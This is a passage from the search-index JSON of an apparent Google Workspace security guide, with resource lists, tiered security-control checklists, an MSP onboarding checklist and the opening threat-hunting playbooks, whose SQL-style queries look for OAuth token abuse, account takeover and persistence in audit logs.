Management</li> <li>Drive Sharing Settings</li> <li>Content Compliance Rules</li> <li>Google Vault for Data Governance</li> </ul>"},{"location":"resources/#email-security","title":"Email Security","text":"<ul> <li>Gmail Security Checklist</li> <li>Email Content Compliance</li> <li>SPF, DKIM, and DMARC Implementation</li> <li>Google Workspace Security Dashboard</li> <li>Gmail Advanced Phishing and Malware Protection</li> </ul>"},{"location":"resources/#endpoint-management","title":"Endpoint Management","text":"<ul> <li>Google Endpoint Management</li> <li>Mobile Management for Google Workspace</li> <li>Google Workspace Device Policies</li> <li>Chrome Browser Cloud Management</li> <li>Chrome Enterprise Security</li> </ul>"},{"location":"resources/#security-monitoring-and-response","title":"Security Monitoring and Response","text":"<ul> <li>Alert Center for Google Workspace</li> <li>Investigation Tool</li> <li>Security Health Dashboard</li> <li>Google Workspace Alerts</li> <li>Google Workspace Rules</li> </ul>"},{"location":"resources/#technical-api-documentation","title":"Technical API Documentation","text":""},{"location":"resources/#admin-sdk-apis","title":"Admin SDK APIs","text":"<ul> <li>Directory API</li> <li>Reports API</li> <li>Reseller API</li> <li>Groups Settings API</li> <li>Enterprise License Manager API</li> </ul>"},{"location":"resources/#google-workspace-service-apis","title":"Google Workspace Service APIs","text":"<ul> <li>Gmail API</li> <li>Drive API</li> <li>Calendar API</li> <li>Google Sheets API</li> <li>Google Docs API</li> </ul>"},{"location":"resources/#security-apis","title":"Security APIs","text":"<ul> <li>Alert Center API</li> <li>Security Investigation API</li> <li>Cloud Identity API</li> <li>OAuth Token Info API</li> <li>Security Command Center API</li> </ul>"},{"location":"resources/#access-control-apis","title":"Access Control APIs","text":"<ul> <li>Access Context Manager API</li> <li>Identity and Access Management API</li> <li>Identity-Aware Proxy API</li> <li>Cloud Resource Manager API</li> <li>Service Usage API</li> </ul>"},{"location":"resources/#security-whitepapers","title":"Security Whitepapers","text":""},{"location":"resources/#google-cloud-security-whitepapers","title":"Google Cloud Security Whitepapers","text":"<ul> <li>Google Infrastructure Security Design Overview</li> <li>Encryption at Rest in Google Cloud</li> <li>Google Cloud Security Foundations Guide</li> <li>BeyondCorp: A New Approach to Enterprise Security</li> <li>Google Workspace and Google Cloud GDPR Resource Center</li> </ul>"},{"location":"resources/#third-party-security-whitepapers","title":"Third-Party Security Whitepapers","text":"<ul> <li>SANS Google Cloud Platform Security Checklist</li> <li>CIS Google Cloud Platform Foundation Benchmark</li> <li>Google Workspace Security Benchmark</li> <li>NIST Cloud Computing Security Guide</li> <li>Cloud Security Alliance Cloud Controls Matrix</li> </ul>"},{"location":"resources/#industry-specific-security-guides","title":"Industry-Specific Security Guides","text":"<ul> <li>HIPAA Implementation Guide for Google Cloud</li> <li>PCI DSS in Google Cloud</li> <li>Financial Services Security in Google Cloud</li> <li>Google Cloud for Government</li> <li>Google Cloud for Healthcare</li> </ul>"},{"location":"resources/#community-templates","title":"Community Templates","text":""},{"location":"resources/#security-assessment-templates","title":"Security Assessment Templates","text":"<ul> <li>Google Workspace Security Assessment Template</li> <li>Google Cloud Security Audit Checklist</li> <li>GCP Security Controls Mapping</li> <li>Google Workspace Security Scorecard</li> <li>Cloud Security Maturity Assessment</li> </ul>"},{"location":"resources/#policy-templates","title":"Policy Templates","text":"<ul> <li>Google Workspace Acceptable Use Policy Template</li> <li>Cloud Security Policy Framework</li> <li>Data Classification Policy Template</li> <li>Incident Response Plan Template</li> <li>Security Exception Process Template</li> </ul>"},{"location":"resources/#security-implementation-scripts","title":"Security Implementation Scripts","text":"<ul> <li>Google Workspace Security Configuration Scripts</li> <li>Google Cloud Security Scripts</li> <li>GCP Audit Logging Scripts</li> <li>Google Workspace DLP Implementation Scripts</li> <li>Google Cloud Security Command Center Automation</li> </ul>"},{"location":"resources/#monitoring-and-dashboard-templates","title":"Monitoring and Dashboard Templates","text":"<ul> <li>Google Workspace Security Dashboard Template</li> <li>Admin Activity Monitoring Dashboard</li> <li>Login Audit Analysis Dashboard</li> <li>Drive Security Monitoring Dashboard</li> <li>Gmail Security Metrics Dashboard</li> </ul>"},{"location":"resources/#training-resources","title":"Training Resources","text":""},{"location":"resources/#google-workspace-security-training","title":"Google Workspace Security Training","text":"<ul> <li>Google Workspace Security Best Practices Training</li> <li>Google Cloud Security Engineer Training Path</li> <li>Google Security Operations and Response Training</li> <li>Google Workspace Administrator Certification</li> <li>Google Professional Cloud Security Engineer Certification</li> </ul>"},{"location":"resources/#end-user-security-training","title":"End-User Security Training","text":"<ul> <li>Google Workspace Security for End Users</li> <li>Phishing Awareness Training Resources</li> <li>Google Workspace Security Awareness Posters</li> <li>Google Password Security Training</li> <li>Google Security Checkup Guide</li> </ul>"},{"location":"resources/#security-labs-and-workshops","title":"Security Labs and Workshops","text":"<ul> <li>Google Cloud Security Labs</li> <li>Google Security Workshop Materials</li> <li>Google Chrome Enterprise Security Lab</li> <li>Google Identity Security Lab</li> <li>Google Cloud Security Summit Resources</li> </ul>"},{"location":"resources/#compliance-resources","title":"Compliance Resources","text":""},{"location":"resources/#compliance-documentation","title":"Compliance Documentation","text":"<ul> <li>Google Cloud Compliance Resource Center</li> <li>Google Workspace Compliance Reports</li> <li>Google Security Certifications</li> <li>Google Cloud Data Processing Addendum</li> <li>Google Risk Assessment Documentation</li> </ul>"},{"location":"resources/#compliance-implementation-guides","title":"Compliance Implementation Guides","text":"<ul> <li>Google Cloud GDPR Implementation Guide</li> <li>Google Cloud HIPAA Implementation Guide</li> <li>Google Cloud PCI DSS Implementation Guide</li> <li>Google Cloud NIST 800-53 Implementation Guide</li> <li>Google Cloud ISO 27001 Implementation Guide</li> </ul>"},{"location":"resources/#audit-assistance-resources","title":"Audit Assistance Resources","text":"<ul> <li>Google Cloud Compliance Audit Guide</li> <li>Google Workspace Audit Documentation Template</li> <li>Google Cloud Security Evidence Collection Guide</li> <li>Google Cloud Compliance Matrix Template</li> <li>Cloud Security Alliance CAIQ for Google Cloud</li> </ul>"},{"location":"resources/#community-resources","title":"Community Resources","text":""},{"location":"resources/#forums-and-communities","title":"Forums and Communities","text":"<ul> <li>Google Cloud Community</li> <li>Google Workspace Admin Community</li> <li>Google Cloud Slack Community</li> <li>Stack Overflow Google Workspace Tags</li> <li>Google Cloud Security User Group</li> </ul>"},{"location":"resources/#blogs-and-news-sources","title":"Blogs and News Sources","text":"<ul> <li>Google Cloud Blog - Security Category</li> <li>Google Workspace Updates Blog</li> <li>Google Security Blog</li> <li>Chronicle Security Blog</li> <li>BeyondCorp Blog</li> </ul>"},{"location":"resources/#youtube-channels-and-videos","title":"YouTube Channels and Videos","text":"<ul> <li>Google Cloud Tech YouTube Channel</li> <li>Google Workspace YouTube Channel</li> <li>Google Cloud Security Playlist</li> <li>Google Workspace Security Essentials</li> <li>Cloud Security Podcast</li> </ul>"},{"location":"resources/#third-party-security-tools","title":"Third-Party Security Tools","text":"<ul> <li>Google Cloud Security Tools Directory</li> <li>Marketplace Security Solutions for Google Workspace</li> <li>SIEM Integrations for Google Workspace</li> <li>Google Cloud Security Command Center Integrations</li> <li>Identity-Aware Proxy Integrations</li> </ul> <p>Note: All resource links should be periodically verified as URLs may change over time.</p>"},{"location":"security-checklists/","title":"Security Checklists","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance</p>"},{"location":"security-checklists/#google-workspace-security-implementation-checklists","title":"Google Workspace Security Implementation Checklists","text":"<p>This document provides comprehensive security implementation checklists for Google Workspace environments. These checklists are designed to help organizations systematically implement security controls across different maturity levels.</p>"},{"location":"security-checklists/#how-to-use-these-checklists","title":"How to Use These Checklists","text":"<ol> <li>Assess your current state: Review each checklist to identify controls already in place</li> <li>Prioritize gaps: Focus on missing controls that represent the most critical security gaps</li> <li>Create implementation plans: Develop timelines and resource allocations for addressing gaps</li> <li>Document exceptions: Record any controls that cannot be implemented with appropriate justification</li> <li>Validate implementation: Verify that controls are functioning as intended</li> <li>Regular review: Revisit checklists quarterly to ensure continued compliance</li> </ol>"},{"location":"security-checklists/#essential-security-controls","title":"Essential Security Controls","text":"<p>These controls represent the minimum security requirements recommended for all Google Workspace environments.</p>"},{"location":"security-checklists/#account-security","title":"Account Security","text":"<ul> <li> MFA enforcement: Enable 2-Step Verification for all user accounts</li> <li> Strong password requirements: Set minimum 12-character password length</li> <li> Password breach detection: Enable Google's password breach detection</li> <li> User lifecycle management: Implement procedures for user onboarding/offboarding</li> <li> Recovery methods verification: Require recovery email/phone verification</li> <li> Authentication alerting: Set up alerts for suspicious login attempts</li> <li> Password reuse prevention: Enable password history enforcement</li> <li> Advanced Protection Program: Implement for admin and high-risk accounts</li> <li> Consumer account separation: Separate organizational and personal accounts</li> </ul>"},{"location":"security-checklists/#administrative-control","title":"Administrative Control","text":"<ul> <li> Admin role separation: Implement separation of duties for admin functions</li> <li> Super admin protection: Secure super admin accounts with hardware keys</li> <li> Admin access logging: Enable comprehensive logging of admin actions</li> <li> Emergency access procedure: Document break-glass procedures for admin access</li> <li> Admin account inventory: Maintain inventory of all administrative accounts</li> <li> Privileged access reviews: Conduct quarterly admin privilege reviews</li> <li> Admin account delegation: Restrict admin delegation to authorized personnel</li> <li> Service account governance: Implement controls for service account creation and use</li> <li> Admin training: Ensure administrators receive security training</li> </ul>"},{"location":"security-checklists/#data-protection","title":"Data Protection","text":"<ul> <li> DLP for Gmail: Implement DLP rules for sensitive content in emails</li> <li> DLP for Drive: Configure DLP scanning for documents</li> <li> External sharing restrictions: Set appropriate limits on external sharing</li> <li> Link sharing defaults: Configure restrictive defaults for link sharing</li> <li> Drive sharing alerting: Monitor for unusual sharing patterns</li> <li> Information Rights Management: Enable for sensitive documents</li> <li> Data retention policies: Implement appropriate retention rules</li> <li> Drive audit logging: Enable comprehensive Drive activity logging</li> <li> Gmail content compliance: Configure content compliance rules</li> </ul>"},{"location":"security-checklists/#access-control","title":"Access Control","text":"<ul> <li> Organizational unit structure: Implement logical OU structure for access control</li> <li> Group-based access: Utilize groups for access management</li> <li> External access review: Regular review of external user access</li> <li> Mobile device management: Implement basic MDM controls</li> <li> Access request workflow: Document process for access requests and approvals</li> <li> Third-party application review: Process for evaluating third-party applications</li> <li> Context-aware access: Configure basic rules for suspicious login detection</li> <li> Inactive account handling: Disable accounts inactive for 90+ days</li> <li> Guest user restrictions: Configure appropriate access for guest users</li> </ul>"},{"location":"security-checklists/#security-monitoring","title":"Security Monitoring","text":"<ul> <li> Security alert configuration: Set up critical security alerts</li> <li> Login anomaly detection: Monitor for unusual login patterns</li> <li> Admin activity review: Process for reviewing admin console activities</li> <li> Audit log retention: Configure appropriate log retention periods</li> <li> Security dashboard review: Regular review of security dashboard</li> <li> Security health review: Regular review of security health recommendations</li> <li> External access monitoring: Monitor for unusual external access patterns</li> <li> DLP violation response: Process for responding to DLP violations</li> <li> Regular security posture assessment: Quarterly review of security settings</li> </ul>"},{"location":"security-checklists/#email-security","title":"Email Security","text":"<ul> <li> SPF records: Configure and maintain valid SPF records</li> <li> DKIM implementation: Enable DKIM signing for all domains</li> <li> DMARC configuration: Implement DMARC with appropriate policy</li> <li> External email warning: Enable warnings for emails from outside organization</li> <li> Attachment scanning: Enable enhanced attachment scanning</li> <li> Phishing and malware protection: Enable Google's enhanced protections</li> <li> Suspicious link warnings: Enable warnings for suspicious links</li> <li> Email routing rules: Review and secure email routing configurations</li> <li> Email security groups: Configure groups for email security announcements</li> </ul>"},{"location":"security-checklists/#endpoint-security","title":"Endpoint Security","text":"<ul> <li> Device inventory: Maintain inventory of all managed devices</li> <li> Basic device policies: Implement screen lock and encryption requirements</li> <li> Approved device types: Define approved device types for access</li> <li> Mobile device wipe capability: Enable remote wipe functionality</li> <li> Account security on devices: Ensure proper account security on mobile devices</li> <li> Chrome security settings: Configure basic Chrome security settings</li> <li> Device access monitoring: Monitor for access from unknown devices</li> <li> Device trust validation: Implement basic device trust validation</li> <li> Auto-update requirements: Enforce automatic updates where possible</li> </ul>"},{"location":"security-checklists/#incident-response","title":"Incident Response","text":"<ul> <li> Security incident plan: Document basic security incident response procedures</li> <li> Account compromise playbook: Specific procedure for account compromise</li> <li> Response team contacts: Document security response team contacts</li> <li> Escalation procedures: Define escalation paths for security incidents</li> <li> Communication templates: Prepare templates for security incident communications</li> <li> Investigation process: Document process for security investigations</li> <li> Evidence preservation: Procedures for preserving evidence during incidents</li> <li> Third-party contact information: Maintain contacts for external response support</li> <li> Post-incident review: Process for reviewing and learning from incidents</li> </ul>"},{"location":"security-checklists/#advanced-security-controls","title":"Advanced Security Controls","text":"<p>These controls represent enhanced protection recommended for sensitive environments or organizations with higher security requirements.</p>"},{"location":"security-checklists/#advanced-identity-protection","title":"Advanced Identity Protection","text":"<ul> <li> Hardware security keys: Require physical security keys for authentication</li> <li> Conditional access policies: Implement risk-based access conditions</li> <li> Session duration controls: Configure appropriate session timeouts</li> <li> Authentication strength by resource: Vary authentication requirements by resource sensitivity</li> <li> Continuous authentication: Implement reauthentication for sensitive actions</li> <li> Identity threat detection: Deploy advanced identity threat detection</li> <li> On-device credentials: Utilize on-device secure credentials where possible</li> <li> Custom password strength: Implement advanced custom password requirements</li> <li> Biometric validation: Utilize biometric factors where supported</li> </ul>"},{"location":"security-checklists/#enhanced-administrative-security","title":"Enhanced Administrative Security","text":"<ul> <li> Tiered admin access: Implement tiered administrative access model</li> <li> Admin session monitoring: Real-time monitoring of administrative sessions</li> <li> Privileged access workstations: Dedicate secure devices for administration</li> <li> Just-in-time admin access: Enable temporary access for administrative tasks</li> <li> Admin activity correlation: Correlate admin activities across services</li> <li> Administrative approval workflows: Multi-person approval for sensitive changes</li> <li> Separation of duties enforcement: Technical controls for separation of duties</li> <li> Advanced admin alerting: Sophisticated alerting on admin behavior anomalies</li> <li> Privilege escalation monitoring: Detection of unauthorized privilege escalation</li> </ul>"},{"location":"security-checklists/#advanced-data-protection","title":"Advanced Data Protection","text":"<ul> <li> Customer-managed encryption keys: Implement CMEK for critical data</li> <li> Advanced DLP with context: Context-aware DLP rules with machine learning</li> <li> Automated data classification: Auto-classification of sensitive documents</li> <li> Data access governance: Comprehensive data access governance program</li> <li> Content inspection API integration: Custom content inspection for specialized data</li> <li> Third-party DLP integration: Integration with specialized DLP solutions</li> <li> Behavioral DLP: DLP based on user behavior patterns</li> <li> Cross-platform data correlation: Track data across multiple platforms</li> <li> Data access anomaly detection: ML-based detection of unusual access patterns</li> </ul>"},{"location":"security-checklists/#zero-trust-implementation","title":"Zero Trust Implementation","text":"<ul> <li> Device trust integration: Comprehensive device trust verification</li> <li> Context-aware access policies: Granular access policies based on context</li> <li> Continuous authorization: Regular revalidation of access permissions</li> <li> BeyondCorp implementation: Full implementation of BeyondCorp principles</li> <li> Micro-segmentation: Granular access controls based on data sensitivity</li> <li> Risk-based authentication: Authentication requirements based on risk score</li> <li> VPA (Virtual Private Access): Implement for sensitive application access</li> <li> Zero implicit trust: Remove all implicit trust assumptions</li> <li> Continuous validation: Ongoing validation of user and device state</li> </ul>"},{"location":"security-checklists/#advanced-monitoring-and-analytics","title":"Advanced Monitoring and Analytics","text":"<ul> <li> Security information and event management: SIEM integration</li> <li> User behavior analytics: Advanced UBA for anomaly detection</li> <li> Advanced threat hunting: Proactive threat hunting capability</li> <li> Machine learning detection: ML-based detection of suspicious patterns</li> <li> Cross-platform security correlation: Connect signals across security systems</li> <li> Custom security dashboards: Tailored dashboards for security posture visibility</li> <li> Automated investigation workflows: Automation of common investigation tasks</li> <li> Log centralization and analysis: Central repository for comprehensive analysis</li> <li> Threat intelligence integration: Incorporation of threat intelligence feeds</li> </ul>"},{"location":"security-checklists/#advanced-email-security","title":"Advanced Email Security","text":"<ul> <li> Third-party email security gateway: Enhanced email filtering and protection</li> <li> Business email compromise protection: Advanced BEC detection</li> <li> Custom phishing simulations: Regular targeted phishing training exercises</li> <li> Executive email protection: Special protection for executive accounts</li> <li> Email authentication monitoring: Continuous monitoring of email authentication</li> <li> Partner email security verification: Validation of partner email security posture</li> <li> Email security analytics: Advanced analytics for email threat patterns</li> <li> Secure email collaboration: Enhanced security for external email collaboration</li> <li> Email DLP with contextual awareness: Context-aware DLP for email communications</li> </ul>"},{"location":"security-checklists/#advanced-endpoint-security","title":"Advanced Endpoint Security","text":"<ul> <li> Endpoint detection and response: Deploy EDR solutions</li> <li> Application allowlisting: Implement application control</li> <li> Advanced device attestation: Strong device integrity verification</li> <li> OS security baseline enforcement: Enforce security baselines for all OSes</li> <li> Hardware-backed security: Utilize hardware security features</li> <li> Endpoint isolation capability: Ability to isolate compromised endpoints</li> <li> Advanced mobile threat defense: Deploy MTD solutions</li> <li> Secure boot verification: Verify secure boot on endpoints</li> <li> Firmware integrity validation: Ensure firmware integrity on endpoints</li> </ul>"},{"location":"security-checklists/#advanced-incident-response","title":"Advanced Incident Response","text":"<ul> <li> Security orchestration and automation: Implement SOAR capabilities</li> <li> Digital forensics capability: Advanced digital forensics tools and processes</li> <li> Tabletop exercises: Regular incident response exercises</li> <li> Threat hunting integration: Connect threat hunting with incident response</li> <li> Cross-functional response teams: Comprehensive IR team structure</li> <li> External IR support arrangements: Pre-arranged external incident response support</li> <li> Advanced containment strategies: Sophisticated incident containment capabilities</li> <li> Adversary emulation exercises: Red team exercises to test response</li> <li> Continuous IR improvement: Program for ongoing IR capability enhancement</li> </ul>"},{"location":"security-checklists/#msp-client-onboarding-checklist","title":"MSP Client Onboarding Checklist","text":"<p>This checklist is designed specifically for MSPs to ensure secure onboarding of new Google Workspace clients.</p>"},{"location":"security-checklists/#pre-deployment-assessment","title":"Pre-Deployment Assessment","text":"<ul> <li> Security requirements gathering: Document client security requirements</li> <li> Compliance needs assessment: Identify regulatory and compliance requirements</li> <li> Existing security posture evaluation: Assess current security state</li> <li> Risk assessment: Identify critical assets and threats</li> <li> Technical environment assessment: Document technical environment details</li> <li> Security stakeholder identification: Identify key security contacts</li> <li> Current security tool inventory: Document existing security technologies</li> <li> Security process documentation: Gather existing security process information</li> <li> Security incident history review: Understand previous security incidents</li> </ul>"},{"location":"security-checklists/#secure-deployment-planning","title":"Secure Deployment Planning","text":"<ul> <li> Security tier assignment: Assign appropriate security service tier</li> <li> OU design for security: Design OU structure for security requirements</li> <li> Authentication strategy: Document authentication approach</li> <li> Admin accounts planning: Plan administrative account structure</li> <li> Security groups design: Design security-related groups</li> <li> Data protection strategy: Develop data protection approach</li> <li> Email security planning: Plan email security configuration</li> <li> Mobile device approach: Design mobile device security strategy</li> <li> Migration security: Address security during migration phase</li> </ul>"},{"location":"security-checklists/#initial-security-configuration","title":"Initial Security Configuration","text":"<ul> <li> Default security settings: Apply baseline security settings</li> <li> Initial admin accounts: Create secure administrative accounts</li> <li> MFA deployment plan: Develop MFA rollout approach</li> <li> Password policy configuration: Set password requirements</li> <li> Email security baseline: Apply basic email security settings</li> <li> Drive security baseline: Configure basic Drive security</li> <li> Mobile device baseline: Set up basic mobile device management</li> <li> Alert configuration: Configure critical security alerts</li> <li> Delegated administration: Configure MSP delegated admin access</li> </ul>"},{"location":"security-checklists/#advanced-security-implementation","title":"Advanced Security Implementation","text":"<ul> <li> Tiered security deployment: Implement security controls by tier</li> <li> DLP configuration: Deploy appropriate DLP controls</li> <li> Context-aware access: Configure context-aware access policies</li> <li> Advanced endpoint management: Implement enhanced device controls</li> <li> Third-party security integration: Connect complementary security tools</li> <li> SIEM integration: Configure security log exports</li> <li> Custom security dashboards: Create client-specific security dashboards</li> <li> Advanced alert configuration: Set up comprehensive alerting</li> <li> Security automation deployment: Implement security automations</li> </ul>"},{"location":"security-checklists/#governance-and-documentation","title":"Governance and Documentation","text":"<ul> <li> Security policies documentation: Document all security policies</li> <li> Admin procedures: Document administrative procedures</li> <li> Security responsibilities matrix: Define security responsibility assignments</li> <li> Escalation procedures: Document security escalation paths</li> <li> Regular review schedule: Set schedule for security reviews</li> <li> Compliance documentation: Prepare compliance documentation</li> <li> Security training materials: Develop client-specific training</li> <li> Security reporting templates: Create security reporting formats</li> <li> Continuous improvement plan: Document approach for ongoing security enhancement</li> </ul>"},{"location":"security-checklists/#client-training-and-handover","title":"Client Training and Handover","text":"<ul> <li> Admin security training: Conduct training for client administrators</li> <li> End-user security awareness: Provide end-user security materials</li> <li> Security dashboard review: Train on security dashboard use</li> <li> Alert response training: Educate on alert response procedures</li> <li> Security reporting review: Explain security reporting</li> <li> Incident response procedures: Review incident response processes</li> <li> Escalation contacts: Confirm escalation contacts</li> <li> Ongoing security engagement: Set expectations for security reviews</li> <li> Documentation handover: Provide all security documentation</li> </ul>"},{"location":"security-checklists/#operational-security","title":"Operational Security","text":"<ul> <li> Security monitoring activation: Begin active security monitoring</li> <li> First security review scheduling: Schedule initial security review</li> <li> Security improvement tracking: Establish improvement tracking</li> <li> Phishing simulation planning: Schedule phishing simulations</li> <li> Regular security assessment: Plan regular security assessments</li> <li> Update management process: Confirm update management procedure</li> <li> Security incident tests: Schedule incident response testing</li> <li> Admin account reviews: Set up admin account review schedule</li> <li> Security metrics tracking: Begin tracking security metrics</li> </ul>"},{"location":"security-checklists/#resources","title":"Resources","text":"<ul> <li>Google Workspace Security Best Practices</li> <li>Google Cloud Security Blueprints</li> <li>NIST Cybersecurity Framework</li> <li>CIS Google Workspace Benchmark</li> <li>SANS Critical Security Controls</li> </ul> <p>Note: These checklists should be adapted to your organization's specific needs and risk profile. Not all controls may be applicable to every environment.</p>"},{"location":"threat-hunting/","title":"Threat Hunting","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance</p>"},{"location":"threat-hunting/#threat-hunting-playbooks-for-google-workspace","title":"Threat Hunting Playbooks for Google Workspace","text":"<p>This guide provides detailed, actionable threat hunting playbooks for Google Workspace environments, enabling security teams to proactively identify potential compromises and adversary activity.</p>"},{"location":"threat-hunting/#understanding-threat-hunting-in-google-workspace","title":"Understanding Threat Hunting in Google Workspace","text":"<p>Threat hunting in Google Workspace involves proactively searching through logs, settings, and user activities to identify potential security threats that have evaded automated detection. Effective threat hunting:</p> <ul> <li>Reduces attacker dwell time</li> <li>Identifies novel attack techniques</li> <li>Uncovers security misconfigurations</li> <li>Validates security controls</li> <li>Builds institutional security knowledge</li> </ul>"},{"location":"threat-hunting/#core-requirements-for-effective-threat-hunting","title":"Core Requirements for Effective Threat Hunting","text":""},{"location":"threat-hunting/#data-sources","title":"Data Sources","text":"<p>Effective Google Workspace threat hunting requires access to:</p> <ul> <li>Admin console logs: Configuration changes, admin actions, security settings</li> <li>Login audit logs: Authentication events, login patterns, session details</li> <li>Access transparency logs: Google administrator accesses to your content</li> <li>Drive audit logs: Document sharing, downloads, and modification events</li> <li>Gmail logs: Mail flow, filtering decisions, and security events</li> <li>API usage logs: Third-party application activities and integrations</li> <li>Data access logs: Access to sensitive data and potential exfiltration</li> <li>Mobile device logs: Device status, security posture, and management events</li> </ul>"},{"location":"threat-hunting/#hunting-tools","title":"Hunting Tools","text":"<p>Leverage these tools for Google Workspace threat hunting:</p> <ul> <li>Google Security Center: Built-in security analytics and alerts</li> <li>Log export to SIEM: Integration with security information event management systems</li> <li>BigQuery analysis: Advanced querying and correlation of exported logs</li> <li>Google Workspace APIs: Programmatic access to security-relevant information</li> <li>Custom scripts: Purpose-built tools for specific hunting objectives</li> <li>Alert Investigation Tool: Investigating security alerts in Google Workspace</li> </ul>"},{"location":"threat-hunting/#threat-hunting-playbooks","title":"Threat Hunting Playbooks","text":""},{"location":"threat-hunting/#playbook-1-oauth-token-abuse-detection","title":"Playbook 1: OAuth Token Abuse Detection","text":"<p>Objective: Identify potentially malicious OAuth tokens with excessive privileges or unusual usage patterns</p> <p>Data Sources: Admin SDK Reports API, Admin logs, Token audit logs</p> <p>Hypothesis: Attackers may be abusing OAuth tokens to maintain persistent access</p> <p>Hunt Methodology:</p> <ol> <li>Baseline Analysis</li> <li>Identify all authorized OAuth applications in the environment</li> <li>Document normal usage patterns and authorized scopes</li> <li> <p>Establish typical application-to-user relationships</p> </li> <li> <p>Anomaly Detection</p> </li> <li>Query tokens with unusual or excessive scope combinations:      <pre><code>SELECT application_name, scopes, COUNT(user) as user_count\nFROM oauth_token_logs\nWHERE scopes CONTAINS 'https://www.googleapis.com/auth/gmail.send'\nAND scopes CONTAINS 'https://www.googleapis.com/auth/drive'\nGROUP BY application_name, scopes\nORDER BY user_count ASC\n</code></pre></li> <li> <p>Look for recently authorized applications with sensitive scopes:      <pre><code>SELECT application_name, scopes, authorize_time, user\nFROM oauth_token_logs\nWHERE authorize_time &gt; DATE_SUB(CURRENT_DATE(), INTERVAL 7 DAY)\nAND (scopes CONTAINS 'https://www.googleapis.com/auth/gmail' OR\n     scopes CONTAINS 'https://www.googleapis.com/auth/drive')\n</code></pre></p> </li> <li> <p>Usage Pattern Analysis</p> </li> <li>Identify tokens with usage patterns indicating automation:      <pre><code>SELECT token_id, application_name, COUNT(activity) as activity_count\nFROM token_activity_logs\nWHERE timestamp &gt; DATE_SUB(CURRENT_DATE(), INTERVAL 3 DAY)\nGROUP BY token_id, application_name\nHAVING activity_count &gt; 1000\n</code></pre></li> <li> <p>Look for tokens active during unusual hours:      <pre><code>SELECT token_id, application_name, user, HOUR(timestamp) as hour_of_day\nFROM token_activity_logs\nWHERE HOUR(timestamp) BETWEEN 0 AND 5\nAND WEEKDAY(timestamp) BETWEEN 1 AND 5\n</code></pre></p> </li> <li> <p>Cross-correlation</p> </li> <li>Correlate suspicious token activity with login anomalies</li> <li>Compare token usage with user behavior baselines</li> <li> <p>Check for tokens authorized during suspicious login sessions</p> </li> <li> <p>Validation &amp; Response</p> </li> <li>Manually review suspicious application permissions</li> <li>Verify business justification for questionable tokens</li> <li>Revoke unauthorized tokens and document findings</li> </ol>"},{"location":"threat-hunting/#playbook-2-account-takeover-hunting","title":"Playbook 2: Account Takeover Hunting","text":"<p>Objective: Identify compromised accounts through login behavior and post-compromise activities</p> <p>Data Sources: Login audit logs, Admin logs, Gmail logs, Drive audit logs</p> <p>Hypothesis: Compromised accounts will exhibit login anomalies followed by suspicious activities</p> <p>Hunt Methodology:</p> <ol> <li>Login Pattern Analysis</li> <li>Look for impossible travel scenarios:      <pre><code>SELECT user_email, login_time, ip_address, country\nFROM login_logs\nORDER BY user_email, login_time\n</code></pre></li> <li> <p>Analyze by pivoting from this data to identify rapid location changes</p> </li> <li> <p>Identify unusual authentication methods:      <pre><code>SELECT user_email, auth_method, COUNT(*) as auth_count\nFROM login_logs\nWHERE timestamp &gt; DATE_SUB(CURRENT_DATE(), INTERVAL 30 DAY)\nGROUP BY user_email, auth_method\n</code></pre></p> </li> <li> <p>Look for changes in authentication patterns over time</p> </li> <li> <p>Post-Authentication Activity Analysis</p> </li> <li> <p>Hunt for password or MFA changes shortly after suspicious logins:      <pre><code>SELECT user_email, activity_type, timestamp\nFROM admin_logs\nWHERE activity_type IN ('PASSWORD_CHANGE', 'MFA_CHANGE', 'RECOVERY_EMAIL_CHANGE')\nAND timestamp &gt; DATE_SUB(CURRENT_DATE(), INTERVAL 7 DAY)\n</code></pre></p> </li> <li> <p>Look for unusual email processing rules:      <pre><code>SELECT user_email, rule_created_time, rule_criteria, rule_action\nFROM email_settings_logs\nWHERE rule_action CONTAINS 'FORWARD'\nAND timestamp &gt; DATE_SUB(CURRENT_DATE(), INTERVAL 14 DAY)\n</code></pre></p> </li> <li> <p>Data Access Pattern Analysis</p> </li> <li> <p>Look for unusual document access or download spikes:      <pre><code>SELECT user_email, COUNT(*) as download_count\nFROM drive_activity_logs\nWHERE activity_type = 'DOWNLOAD'\nAND timestamp &gt; DATE_SUB(CURRENT_DATE(), INTERVAL 3 DAY)\nGROUP BY user_email\nORDER BY download_count DESC\n</code></pre></p> </li> <li> <p>Identify sensitive document access from unusual locations:      <pre><code>SELECT user_email, document_id, ip_address, country\nFROM drive_activity_logs\nWHERE document_sensitivity = 'HIGH'\nAND timestamp &gt; DATE_SUB(CURRENT_DATE(), INTERVAL 7 DAY)\nAND ip_address NOT IN (SELECT trusted_ip FROM ip_whitelist)\n</code></pre></p> </li> <li> <p>Validation &amp; Response</p> </li> <li>Create timeline of suspicious activities for potential compromises</li> <li>Check endpoint logs for the impacted users if available</li> <li>Verify whether actions were legitimate with users</li> <li>Document findings and implement response procedures if needed</li> </ol>"},{"location":"threat-hunting/#playbook-3-persistence-mechanism-detection","title":"Playbook 3: Persistence Mechanism Detection","text":"<p>Objective: Identify attacker persistence mechanisms established in Google Workspace</p> <p>Data Sources: Admin console logs, Service account logs, Cloud project logs</p> <p>Hypothesis: Attackers establish persistence using service accounts, authorized applications, or delegated access</p> <p>Hunt Methodology:</p> <ol> <li>App Script Persistence Hunt</li> <li> <p>Identify unusual or recently modified Apps Script triggers:      <pre><code>SELECT script_id, creator_email, trigger_type, creation_time\nFROM apps_script_logs\nWHERE trigger_type = 'TIME_DRIVEN'\nAND creation_time &gt; DATE_SUB(CURRENT_DATE(), INTERVAL 30 DAY)\n</code></pre></p> </li> <li> <p>Hunt for scripts with sensitive scopes:      <pre><code>SELECT script_id, creator_email, script_scope\nFROM script_scope_logs\nWHERE script_scope CONTAINS 'https://www.googleapis.com/auth/gmail'\nOR script_scope CONTAINS 'https://www.googleapis.com/auth/drive'\nOR script_scope CONTAINS 'https://www.googleapis.com/auth/admin'\n</code></pre></p> </li> <li> <p>Delegated Admin Hunt</p> </li> <li> <p>Identify recent delegation changes:      <pre><code>SELECT admin_email, delegated_email, privilege, timestamp\nFROM admin_delegation_logs\nWHERE timestamp &gt; DATE_SUB(CURRENT_DATE(), INTERVAL 60 DAY)\nORDER BY timestamp DESC\n</code></pre></p> </li> <li> <p>Look for unusual privilege combinations:      <pre><code>SELECT delegated_email, COUNT(DISTINCT privilege) as privilege_count\nFROM admin_delegation_logs\nGROUP BY delegated_email\nORDER BY privilege_count DESC\n</code></pre></p> 